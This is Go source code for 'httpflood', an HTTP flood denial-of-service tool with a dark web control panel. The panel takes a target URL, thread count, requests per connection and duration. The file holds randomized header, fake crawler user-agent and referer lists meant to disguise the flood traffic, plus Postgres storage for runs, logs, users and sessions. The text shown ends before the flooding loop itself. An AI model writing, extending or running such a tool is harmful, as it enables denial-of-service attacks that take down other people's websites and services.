/*
Coded by LeeOn123
Please fking code ur script by ur self, kid.

I changed the random integers range to the max of int32.
Now 386 systems should work well.

Looks like most people want to hit the url but not the host/ip.
As a result, here you are.
*/
package main

import (
	"bufio"
	"crypto/tls"
	"database/sql"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	_ "github.com/jackc/pgx/v5/stdlib"
	_ "modernc.org/sqlite"
)

var (
	host      = ""
	port      = "80"
	page      = ""
	mode      = ""
	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
	start     = make(chan bool)
	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
	key     string
	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider  = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
	}
	pageTemplate = template.Must(template.New("page").Parse(pageHTML))
	webStore     *runStore
	runControls  = newRunControlManager()
	runStats     = newRunStatsManager()
)

const pageHTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>httpflood</title>
  <style>
    :root { color-scheme: dark; --bg:#010503; --panel:#06110a; --line:#1b6131; --text:#8eff9a; --muted:#53bb68; --accent:#0ea12c; --danger:#b14a4a; }
    * { box-sizing: border-box; }
    body { margin:0; min-height:100vh; background:radial-gradient(900px 500px at 50% -20%, rgba(58,255,101,.08), transparent 60%), #000; color:var(--text); font-family:Consolas, "Courier New", monospace; padding:12px; }
    body::before { content:""; position:fixed; inset:0; pointer-events:none; background:repeating-linear-gradient(to bottom, rgba(255,255,255,.035) 0 1px, transparent 2px 4px); opacity:.22; }
    .wrap { position:relative; max-width:980px; margin:0 auto; display:grid; gap:12px; }
    .card { background:rgba(2,10,5,.94); border:1px solid var(--line); border-radius:4px; padding:14px; box-shadow:0 0 22px rgba(28,255,73,.1); overflow:auto; }
    h1, h2 { margin:0 0 10px; letter-spacing:0; text-transform:uppercase; text-shadow:0 0 8px rgba(142,255,154,.36); }
    h1 { font-size:1.28rem; }
    h2 { color:var(--muted); font-size:.98rem; }
    p { margin:0; color:var(--muted); }
    form { display:grid; gap:12px; }
    .grid { display:grid; gap:10px; grid-template-columns:repeat(2,minmax(0,1fr)); }
    label { display:grid; gap:6px; color:var(--muted); font-size:.86rem; }
    input, select, textarea { width:100%; border:1px solid var(--line); border-radius:2px; background:#020b04; color:var(--text); padding:9px; font:inherit; }
    input:focus, select:focus, textarea:focus { outline:0; border-color:#b8ff9a; box-shadow:0 0 0 3px rgba(110,255,130,.16); }
    textarea { min-height:110px; resize:vertical; }
    button { border:0; border-radius:2px; background:var(--accent); color:#041307; padding:10px 14px; font:inherit; font-weight:700; text-transform:uppercase; cursor:pointer; }
    button:disabled { opacity:.55; cursor:not-allowed; }
    .message { border:1px solid var(--line); background:#021007; padding:10px; white-space:pre-wrap; overflow-wrap:anywhere; }
    .message:empty { display:none; }
    .message.error { border-color:var(--danger); color:#ff9b9b; }
    .runs { display:grid; gap:8px; }
    .run-row { width:100%; display:flex; align-items:center; justify-content:space-between; gap:12px; border:1px solid var(--line); border-radius:3px; background:#020b04; color:var(--text); padding:10px; text-align:left; text-transform:none; }
    .run-row.active { border-color:#b8ff9a; box-shadow:0 0 0 3px rgba(110,255,130,.12); }
    .run-main { display:grid; gap:5px; min-width:0; }
    .run-main strong, .run-main span { overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
    .run-main span { color:var(--muted); font-size:.78rem; }
    .status { border:1px solid var(--line); border-radius:2px; padding:4px 7px; font-size:.72rem; text-transform:uppercase; white-space:nowrap; }
    .status-running, .status-queued { color:#d7ff9a; border-color:#d7ff9a; }
    .status-paused, .status-stopping { color:#ffd89a; border-color:#ffd89a; }
    .status-completed { color:#8eff9a; border-color:#8eff9a; }
    .status-failed, .status-interrupted, .status-stopped { color:#ff9b9b; border-color:#b14a4a; }
    .log-head { display:flex; align-items:center; justify-content:space-between; gap:10px; margin-bottom:8px; color:var(--muted); font-size:.82rem; }
    .run-actions { display:flex; gap:8px; flex-wrap:wrap; }
    .run-actions button { border:1px solid var(--line); border-radius:2px; background:#021107; color:var(--text); padding:8px 10px; font:inherit; cursor:pointer; text-transform:none; }
    .run-actions button:disabled { opacity:.4; cursor:not-allowed; }
    .telemetry { margin-top:10px; display:grid; gap:8px; grid-template-columns:repeat(4,minmax(0,1fr)); }
    .metric { border:1px solid var(--line); border-radius:2px; padding:8px; background:#021007; }
    .metric .k { display:block; color:var(--muted); font-size:.72rem; text-transform:uppercase; margin-bottom:4px; }
    .metric .v { display:block; color:var(--text); font-size:.95rem; }
    .top-nav { display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
    .top-nav a, .top-nav button { border:1px solid var(--line); border-radius:2px; background:#021107; color:var(--text); padding:8px 10px; font:inherit; text-decoration:none; cursor:pointer; }
    .logs { min-height:340px; font-size:.86rem; line-height:1.45; }
    @media (max-width:720px) { .grid { grid-template-columns:1fr; } body { padding:8px; } .card { padding:10px; } .logs { min-height:240px; } .run-row { align-items:flex-start; flex-direction:column; } }
  </style>
</head>
<body>
  <main class="wrap">
    <section class="card">
      <h1>httpflood</h1>
      <p>terminal web ui / legacy config only</p>
      <div class="top-nav">
        <a href="/monitor">Monitor</a>
        <a href="/accounts">Accounts</a>
        <button id="logout-button" type="button">Logout</button>
      </div>
    </section>
    <section class="card">
      <h2>Start</h2>
      <div id="message" class="message"></div>
      <form id="start-form">
        <div class="grid">
          <label>Target URL
            <input name="url" type="text" value="{{.URL}}" placeholder="http://127.0.0.1:8080/" required>
          </label>
          <label>Threads
            <input name="threads" type="number" min="1" value="{{if eq .Threads 0}}20{{else}}{{.Threads}}{{end}}" required>
          </label>
          <label>Requests per connection
            <input name="requests_per_conn" type="number" min="1" value="{{if eq .RequestsPerConn 0}}100{{else}}{{.RequestsPerConn}}{{end}}" required>
          </label>
          <label>Method
            <select name="method">
              <option value="get" {{if eq .Method "get"}}selected{{end}}>GET</option>
              <option value="post" {{if eq .Method "post"}}selected{{end}}>POST</option>
            </select>
          </label>
          <label>Duration seconds
            <input name="seconds" type="number" min="1" value="{{if eq .Seconds 0}}10{{else}}{{.Seconds}}{{end}}" required>
          </label>
          <label>Header preset
            <select name="header_preset">
              <option value="default" {{if eq .HeaderPreset "default"}}selected{{end}}>Default legacy</option>
              <option value="chrome_basic" {{if eq .HeaderPreset "chrome_basic"}}selected{{end}}>Chrome basic</option>
              <option value="custom" {{if eq .HeaderPreset "custom"}}selected{{end}}>Custom</option>
            </select>
          </label>
        </div>
        <label>Custom Header Text (leave empty for nil)
          <textarea name="headers" placeholder="User-Agent: Example&#10;Accept: text/html">{{.HeaderText}}</textarea>
        </label>
        <button id="start-button" type="submit">Start Run</button>
      </form>
    </section>
    <section class="card">
      <h2>Runs</h2>
      <div id="runs" class="runs"></div>
    </section>
    <section class="card">
      <h2>Run Logs</h2>
      <div class="log-head">
        <span id="active-run-label">No run selected</span>
        <span id="poll-state"></span>
      </div>
      <div class="run-actions">
        <button id="pause-run" type="button">Pause</button>
        <button id="resume-run" type="button">Resume</button>
        <button id="stop-run" type="button">Stop</button>
        <button id="delete-run" type="button">Delete</button>
      </div>
      <div class="telemetry">
        <div class="metric"><span class="k">Req/s (est)</span><span id="metric-rps" class="v">-</span></div>
        <div class="metric"><span class="k">Total Sent</span><span id="metric-total" class="v">-</span></div>
        <div class="metric"><span class="k">Active Threads</span><span id="metric-active" class="v">-</span></div>
        <div class="metric"><span class="k">Error Rate</span><span id="metric-error" class="v">-</span></div>
      </div>
      <textarea id="logs" class="logs" readonly></textarea>
    </section>
  </main>
  <script>
    const form = document.getElementById('start-form');
    const startButton = document.getElementById('start-button');
    const message = document.getElementById('message');
    const runsEl = document.getElementById('runs');
    const logsEl = document.getElementById('logs');
    const activeRunLabel = document.getElementById('active-run-label');
    const pollState = document.getElementById('poll-state');
    const pauseRunButton = document.getElementById('pause-run');
    const resumeRunButton = document.getElementById('resume-run');
    const stopRunButton = document.getElementById('stop-run');
    const deleteRunButton = document.getElementById('delete-run');
    const metricRpsEl = document.getElementById('metric-rps');
    const metricTotalEl = document.getElementById('metric-total');
    const metricActiveEl = document.getElementById('metric-active');
    const metricErrorEl = document.getElementById('metric-error');
    let activeRunId = null;
    let activeRunStatus = '';
    let afterLogId = 0;
    let logLines = [];
    let refreshBusy = false;
    let lastStatsSample = null;

    function setMessage(text, isError) {
      message.textContent = text || '';
      message.className = isError ? 'message error' : 'message';
    }

    function formatDate(value) {
      if (!value) return '-';
      const date = new Date(value);
      if (Number.isNaN(date.getTime())) return value;
      return date.toLocaleString();
    }

    async function api(path, options) {
      const response = await fetch(path, options);
      const payload = await response.json().catch(function () { return {}; });
      if (!response.ok) throw new Error(payload.error || response.statusText);
      return payload;
    }

    function resetLogs() {
      afterLogId = 0;
      logLines = [];
      logsEl.value = '';
      lastStatsSample = null;
      metricRpsEl.textContent = '-';
      metricTotalEl.textContent = '-';
      metricActiveEl.textContent = '-';
      metricErrorEl.textContent = '-';
    }

    function setRunActionButtons() {
      if (!activeRunId) {
        pauseRunButton.disabled = true;
        resumeRunButton.disabled = true;
        stopRunButton.disabled = true;
        deleteRunButton.disabled = true;
        return;
      }
      deleteRunButton.disabled = false;
      pauseRunButton.disabled = !(activeRunStatus === 'running' || activeRunStatus === 'queued');
      resumeRunButton.disabled = !(activeRunStatus === 'paused');
      stopRunButton.disabled = !(activeRunStatus === 'running' || activeRunStatus === 'queued' || activeRunStatus === 'paused' || activeRunStatus === 'stopping');
    }

    function statusClass(status) {
      return 'status status-' + status;
    }

    function renderRuns(runs) {
      runsEl.replaceChildren();
      if (!runs.length) {
        const empty = document.createElement('p');
        empty.textContent = 'No runs yet';
        runsEl.appendChild(empty);
        return;
      }
      for (const run of runs) {
        const row = document.createElement('button');
        row.type = 'button';
        row.className = 'run-row' + (run.id === activeRunId ? ' active' : '');
        row.addEventListener('click', function () {
          if (activeRunId !== run.id) {
            activeRunId = run.id;
            resetLogs();
            refreshLogs();
            renderRuns(runs);
          }
        });

        const main = document.createElement('span');
        main.className = 'run-main';
        const title = document.createElement('strong');
        title.textContent = '#' + run.id + ' ' + run.method.toUpperCase() + ' ' + run.target_url;
        const meta = document.createElement('span');
        meta.textContent = run.threads + ' threads | ' + run.requests_per_conn + ' req/conn | ' + run.seconds + 's | ' + formatDate(run.created_at);
        main.append(title, meta);

        const status = document.createElement('span');
        status.className = statusClass(run.status);
        status.textContent = run.status;
        row.append(main, status);
        runsEl.appendChild(row);
      }
      const selected = runs.find(function (run) { return run.id === activeRunId; });
      if (selected) {
        activeRunStatus = selected.status;
      } else {
        activeRunStatus = '';
      }
      setRunActionButtons();
    }

    async function refreshLogs() {
      if (!activeRunId) {
        activeRunLabel.textContent = 'No run selected';
        return;
      }
      const payload = await api('/api/runs/' + activeRunId + '/logs?after_id=' + afterLogId + '&limit=200');
      activeRunLabel.textContent = 'Run #' + activeRunId;
      for (const entry of payload.logs || []) {
        afterLogId = entry.id;
        logLines.push('[' + formatDate(entry.created_at) + '] [' + entry.layer + '] ' + entry.message);
      }
      if (logLines.length > 1000) logLines = logLines.slice(-1000);
      logsEl.value = logLines.join('\n');
      logsEl.scrollTop = logsEl.scrollHeight;
    }

    async function refreshStats() {
      if (!activeRunId) {
        return;
      }
      const payload = await api('/api/runs/' + activeRunId + '/stats');
      const stats = payload.stats || {};
      const totalSent = Number(stats.total_sent || 0);
      const connErrors = Number(stats.connection_errors || 0);
      const writeErrors = Number(stats.write_errors || 0);
      const activeThreads = Number(stats.active_threads || 0);
      const nowTs = Date.now();
      let estRps = Number(stats.avg_rps || 0);
      if (lastStatsSample && lastStatsSample.runId === activeRunId) {
        const deltaSent = totalSent - lastStatsSample.totalSent;
        const deltaSec = (nowTs - lastStatsSample.ts) / 1000;
        if (deltaSent >= 0 && deltaSec > 0) {
          estRps = deltaSent / deltaSec;
        }
      }
      lastStatsSample = { runId: activeRunId, totalSent: totalSent, ts: nowTs };
      const errorRate = (totalSent + connErrors + writeErrors) > 0
        ? ((connErrors + writeErrors) / (totalSent + connErrors + writeErrors)) * 100
        : 0;
      metricRpsEl.textContent = estRps.toFixed(1);
      metricTotalEl.textContent = totalSent.toLocaleString();
      metricActiveEl.textContent = activeThreads.toLocaleString();
      metricErrorEl.textContent = errorRate.toFixed(2) + '%';
    }

    async function refreshRuns() {
      if (refreshBusy) return;
      refreshBusy = true;
      try {
        const payload = await api('/api/runs');
        const runs = payload.runs || [];
        if (!activeRunId && runs.length) {
          const active = runs.find(function (run) { return run.status === 'running' || run.status === 'queued'; }) || runs[0];
          activeRunId = active.id;
          activeRunStatus = active.status;
          resetLogs();
        }
        renderRuns(runs);
        if (activeRunId) {
          await refreshLogs();
          await refreshStats();
        }
        pollState.textContent = 'Updated ' + new Date().toLocaleTimeString();
      } catch (error) {
        pollState.textContent = 'Poll error';
      } finally {
        refreshBusy = false;
      }
    }

    form.addEventListener('submit', async function (event) {
      event.preventDefault();
      startButton.disabled = true;
      setMessage('Starting run...', false);
      try {
        const payload = await api('/api/runs', { method: 'POST', body: new URLSearchParams(new FormData(form)) });
        activeRunId = payload.run.id;
        activeRunStatus = payload.run.status;
        resetLogs();
        setMessage('Started run #' + activeRunId, false);
        await refreshRuns();
      } catch (error) {
        setMessage(error.message, true);
      } finally {
        startButton.disabled = false;
      }
    });

    setRunActionButtons();
    refreshRuns();
    window.setInterval(refreshRuns, 2000);

    async function runAction(action, method) {
      if (!activeRunId) return;
      const path = action === 'delete' ? '/api/runs/' + activeRunId : '/api/runs/' + activeRunId + '/' + action;
      await api(path, { method: method });
      if (action === 'delete') {
        setMessage('Deleted run #' + activeRunId, false);
        activeRunId = null;
        activeRunStatus = '';
        resetLogs();
      }
      await refreshRuns();
    }

    pauseRunButton.addEventListener('click', async function () {
      try {
        await runAction('pause', 'POST');
        setMessage('Paused run #' + activeRunId, false);
      } catch (error) {
        setMessage(error.message, true);
      }
    });

    resumeRunButton.addEventListener('click', async function () {
      try {
        await runAction('resume', 'POST');
        setMessage('Resumed run #' + activeRunId, false);
      } catch (error) {
        setMessage(error.message, true);
      }
    });

    stopRunButton.addEventListener('click', async function () {
      try {
        await runAction('stop', 'POST');
        setMessage('Stopping run #' + activeRunId, false);
      } catch (error) {
        setMessage(error.message, true);
      }
    });

    deleteRunButton.addEventListener('click', async function () {
      try {
        await runAction('delete', 'DELETE');
      } catch (error) {
        setMessage(error.message, true);
      }
    });

    const logoutButton = document.getElementById('logout-button');
    logoutButton.addEventListener('click', async function () {
      await fetch('/api/logout', { method: 'POST' });
      window.location.href = '/login';
    });
  </script>
</body>
</html>`

type pageData struct {
	Error           string
	Result          string
	URL             string
	Threads         int
	RequestsPerConn int
	Method          string
	Seconds         int
	HeaderPreset    string
	HeaderText      string
	Logs            string
}

type startRunRequest struct {
	URL             string `json:"url"`
	Threads         int    `json:"threads"`
	RequestsPerConn int    `json:"requests_per_conn"`
	Method          string `json:"method"`
	Seconds         int    `json:"seconds"`
	HeaderPreset    string `json:"header_preset"`
	HeaderText      string `json:"header_text"`
}

type runRecord struct {
	ID              int64  `json:"id"`
	TargetURL       string `json:"target_url"`
	Threads         int    `json:"threads"`
	RequestsPerConn int    `json:"requests_per_conn"`
	Method          string `json:"method"`
	Seconds         int    `json:"seconds"`
	HeaderPreset    string `json:"header_preset"`
	HeaderText      string `json:"header_text"`
	Status          string `json:"status"`
	Error           string `json:"error"`
	CreatedAt       string `json:"created_at"`
	StartedAt       string `json:"started_at,omitempty"`
	CompletedAt     string `json:"completed_at,omitempty"`
	UpdatedAt       string `json:"updated_at"`
}

type runLogRecord struct {
	ID        int64  `json:"id"`
	RunID     int64  `json:"run_id"`
	Layer     string `json:"layer"`
	Message   string `json:"message"`
	CreatedAt string `json:"created_at"`
}

const (
	runStopReasonNone int32 = iota
	runStopReasonTimeout
	runStopReasonStopped
	runStopReasonDeleted
)

type runControl struct {
	done       chan struct{}
	doneOnce   sync.Once
	paused     atomic.Bool
	stopReason atomic.Int32
}

func newRunControl() *runControl {
	return &runControl{done: make(chan struct{})}
}

func (c *runControl) Stop(reason int32) {
	c.stopReason.Store(reason)
	c.doneOnce.Do(func() {
		close(c.done)
	})
}

func (c *runControl) Pause() {
	c.paused.Store(true)
}

func (c *runControl) Resume() {
	c.paused.Store(false)
}

type runControlManager struct {
	mu    sync.Mutex
	items map[int64]*runControl
}

func newRunControlManager() *runControlManager {
	return &runControlManager{items: make(map[int64]*runControl)}
}

func (m *runControlManager) Set(runID int64, control *runControl) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.items[runID] = control
}

func (m *runControlManager) Get(runID int64) (*runControl, bool) {
	m.mu.Lock()
	defer m.mu.Unlock()
	control, ok := m.items[runID]
	return control, ok
}

func (m *runControlManager) Delete(runID int64) {
	m.mu.Lock()
	defer m.mu.Unlock()
	delete(m.items, runID)
}

type runRuntimeStats struct {
	startedAtUnixNano atomic.Int64
	totalSent         atomic.Int64
	connectionErrors  atomic.Int64
	writeErrors       atomic.Int64
	activeThreads     atomic.Int64
}

type runRuntimeStatsSnapshot struct {
	RunID            int64   `json:"run_id"`
	ActiveThreads    int64   `json:"active_threads"`
	TotalSent        int64   `json:"total_sent"`
	ConnectionErrors int64   `json:"connection_errors"`
	WriteErrors      int64   `json:"write_errors"`
	ElapsedSeconds   int64   `json:"elapsed_seconds"`
	AvgRPS           float64 `json:"avg_rps"`
	ErrorRate        float64 `json:"error_rate"`
}

func newRunRuntimeStats() *runRuntimeStats {
	stats := &runRuntimeStats{}
	stats.startedAtUnixNano.Store(time.Now().UnixNano())
	return stats
}

func (s *runRuntimeStats) Snapshot(runID int64) runRuntimeStatsSnapshot {
	now := time.Now().UnixNano()
	started := s.startedAtUnixNano.Load()
	elapsedSeconds := int64(0)
	if started > 0 && now > started {
		elapsedSeconds = int64(time.Duration(now - started).Seconds())
	}
	totalSent := s.totalSent.Load()
	connErrors := s.connectionErrors.Load()
	writeErrors := s.writeErrors.Load()
	totalOps := totalSent + connErrors + writeErrors
	errorRate := 0.0
	if totalOps > 0 {
		errorRate = float64(connErrors+writeErrors) / float64(totalOps)
	}
	avgRPS := 0.0
	if elapsedSeconds > 0 {
		avgRPS = float64(totalSent) / float64(elapsedSeconds)
	}
	return runRuntimeStatsSnapshot{
		RunID:            runID,
		ActiveThreads:    s.activeThreads.Load(),
		TotalSent:        totalSent,
		ConnectionErrors: connErrors,
		WriteErrors:      writeErrors,
		ElapsedSeconds:   elapsedSeconds,
		AvgRPS:           avgRPS,
		ErrorRate:        errorRate,
	}
}

type runStatsManager struct {
	mu    sync.Mutex
	items map[int64]*runRuntimeStats
}

func newRunStatsManager() *runStatsManager {
	return &runStatsManager{items: make(map[int64]*runRuntimeStats)}
}

func (m *runStatsManager) Set(runID int64, stats *runRuntimeStats) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.items[runID] = stats
}

func (m *runStatsManager) Get(runID int64) (*runRuntimeStats, bool) {
	m.mu.Lock()
	defer m.mu.Unlock()
	stats, ok := m.items[runID]
	return stats, ok
}

func (m *runStatsManager) Delete(runID int64) {
	m.mu.Lock()
	defer m.mu.Unlock()
	delete(m.items, runID)
}

type logBuffer struct {
	mu      sync.Mutex
	lines   []string
	console bool
	keep    bool
	maxKeep int
	sink    func(layer, message string)
}

func (l *logBuffer) Append(layer string, format string, args ...interface{}) {
	message := fmt.Sprintf(format, args...)
	msg := fmt.Sprintf("[%s] %s", layer, message)
	l.mu.Lock()
	if l.keep {
		l.lines = append(l.lines, msg)
		if l.maxKeep > 0 && len(l.lines) > l.maxKeep {
			l.lines = l.lines[len(l.lines)-l.maxKeep:]
		}
	}
	sink := l.sink
	l.mu.Unlock()
	if l.console {
		fmt.Println(msg)
	}
	if sink != nil {
		sink(layer, message)
	}
}

func (l *logBuffer) String() string {
	l.mu.Lock()
	defer l.mu.Unlock()
	return strings.Join(l.lines, "\n")
}

type runStore struct {
	db *sql.DB
}

func rebindQuestionToDollar(query string) string {
	if !strings.Contains(query, "?") {
		return query
	}
	var b strings.Builder
	b.Grow(len(query) + 16)
	argN := 1
	for _, ch := range query {
		if ch == '?' {
			b.WriteString("$")
			b.WriteString(strconv.Itoa(argN))
			argN++
			continue
		}
		b.WriteRune(ch)
	}
	return b.String()
}

func openRunStore(databaseURL string) (*runStore, error) {
	if strings.TrimSpace(databaseURL) == "" {
		return nil, fmt.Errorf("database URL is required")
	}
	db, err := sql.Open("pgx", databaseURL)
	if err != nil {
		return nil, err
	}
	db.SetMaxOpenConns(16)
	db.SetMaxIdleConns(4)
	db.SetConnMaxLifetime(30 * time.Minute)
	store := &runStore{db: db}
	if err := store.init(); err != nil {
		db.Close()
		return nil, err
	}
	return store, nil
}

func (s *runStore) exec(query string, args ...interface{}) (sql.Result, error) {
	return s.db.Exec(rebindQuestionToDollar(query), args...)
}

func (s *runStore) query(query string, args ...interface{}) (*sql.Rows, error) {
	return s.db.Query(rebindQuestionToDollar(query), args...)
}

func (s *runStore) queryRow(query string, args ...interface{}) *sql.Row {
	return s.db.QueryRow(rebindQuestionToDollar(query), args...)
}

func (s *runStore) init() error {
	for _, query := range []string{
		`CREATE TABLE IF NOT EXISTS runs (
			id BIGSERIAL PRIMARY KEY,
			target_url TEXT NOT NULL,
			threads INTEGER NOT NULL,
			requests_per_conn INTEGER NOT NULL,
			method TEXT NOT NULL,
			seconds INTEGER NOT NULL,
			header_preset TEXT NOT NULL,
			header_text TEXT NOT NULL,
			status TEXT NOT NULL,
			error TEXT NOT NULL DEFAULT '',
			created_at TEXT NOT NULL,
			started_at TEXT,
			completed_at TEXT,
			updated_at TEXT NOT NULL
		)`,
		`CREATE TABLE IF NOT EXISTS run_logs (
			id BIGSERIAL PRIMARY KEY,
			run_id BIGINT NOT NULL,
			layer TEXT NOT NULL,
			message TEXT NOT NULL,
			created_at TEXT NOT NULL,
			FOREIGN KEY(run_id) REFERENCES runs(id) ON DELETE CASCADE
		)`,
		`CREATE TABLE IF NOT EXISTS users (
			id BIGSERIAL PRIMARY KEY,
			username TEXT NOT NULL UNIQUE,
			password_hash TEXT NOT NULL,
			role TEXT NOT NULL,
			can_start_run SMALLINT NOT NULL DEFAULT 1,
			can_view_monitor SMALLINT NOT NULL DEFAULT 1,
			is_active SMALLINT NOT NULL DEFAULT 1,
			created_at TEXT NOT NULL,
			updated_at TEXT NOT NULL,
			created_by BIGINT,
			FOREIGN KEY(created_by) REFERENCES users(id)
		)`,
		`CREATE TABLE IF NOT EXISTS sessions (
			id TEXT PRIMARY KEY,
			user_id BIGINT NOT NULL,
			expires_at TEXT NOT NULL,
			created_at TEXT NOT NULL,
			last_seen_at TEXT NOT NULL,
			FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
		)`,
		"CREATE INDEX IF NOT EXISTS idx_runs_status ON runs(status)",
		"CREATE INDEX IF NOT EXISTS idx_run_logs_run_id_id ON run_logs(run_id, id)",
		"CREATE INDEX IF NOT EXISTS idx_users_username ON users(username)",
		"CREATE INDEX IF NOT EXISTS idx_sessions_user_id ON sessions(user_id)",
		"CREATE INDEX IF NOT EXISTS idx_sessions_expires ON sessions(expires_at)",
	} {
		if _, err := s.exec(query); err != nil {
			return err
		}
	}
	now := time.Now().Format(time.RFC3339)
	_, err := s.exec(
		`UPDATE runs
		 SET status = 'interrupted',
		     error = CASE WHEN error = '' THEN ? ELSE error END,
		     completed_at = ?,
		     updated_at = ?
		 WHERE status IN ('queued', 'running', 'paused', 'stopping')`,
		"server restarted while this run was active", now, now,
	)
	return err
}

func (s *runStore) Close() error {
	return s.db.Close()
}

func (s *runStore) CreateRun(req startRunRequest) (runRecord, error) {
	now := time.Now().Format(time.RFC3339)
	var id int64
	err := s.queryRow(
		`INSERT INTO runs (
			target_url, threads, requests_per_conn, method, seconds,
			header_preset, header_text, status, error, created_at, updated_at
		) VALUES (?, ?, ?, ?, ?, ?, ?, 'queued', '', ?, ?)
		RETURNING id`,
		req.URL, req.Threads, req.RequestsPerConn, req.Method, req.Seconds,
		req.HeaderPreset, req.HeaderText, now, now,
	).Scan(&id)
	if err != nil {
		return runRecord{}, err
	}
	return s.GetRun(id)
}

func (s *runStore) MarkRunStarted(id int64) error {
	now := time.Now().Format(time.RFC3339)
	_, err := s.exec(
		`UPDATE runs SET status = 'running', started_at = ?, updated_at = ?, error = '' WHERE id = ?`,
		now, now, id,
	)
	return err
}

func (s *runStore) FinishRun(id int64, status, message string) error {
	now := time.Now().Format(time.RFC3339)
	_, err := s.exec(
		`UPDATE runs SET status = ?, error = ?, completed_at = ?, updated_at = ? WHERE id = ?`,
		status, message, now, now, id,
	)
	return err
}

func (s *runStore) SetRunStatus(id int64, status, message string) error {
	_, err := s.exec(
		`UPDATE runs SET status = ?, error = ?, updated_at = ? WHERE id = ?`,
		status, message, time.Now().Format(time.RFC3339), id,
	)
	return err
}

func (s *runStore) DeleteRun(id int64) error {
	_, err := s.exec(`DELETE FROM runs WHERE id = ?`, id)
	return err
}

func (s *runStore) AppendLog(runID int64, layer, message string) error {
	_, err := s.exec(
		`INSERT INTO run_logs (run_id, layer, message, created_at) VALUES (?, ?, ?, ?)`,
		runID, layer, message, time.Now().Format(time.RFC3339Nano),
	)
	return err
}

func scanRunRecord(scan func(dest ...interface{}) error) (runRecord, error) {
	var run runRecord
	var startedAt sql.NullString
	var completedAt sql.NullString
	err := scan(
		&run.ID,
		&run.TargetURL,
		&run.Threads,
		&run.RequestsPerConn,
		&run.Method,
		&run.Seconds,
		&run.HeaderPreset,
		&run.HeaderText,
		&run.Status,
		&run.Error,
		&run.CreatedAt,
		&startedAt,
		&completedAt,
		&run.UpdatedAt,
	)
	if err != nil {
		return runRecord{}, err
	}
	if startedAt.Valid {
		run.StartedAt = startedAt.String
	}
	if completedAt.Valid {
		run.CompletedAt = completedAt.String
	}
	return run, nil
}

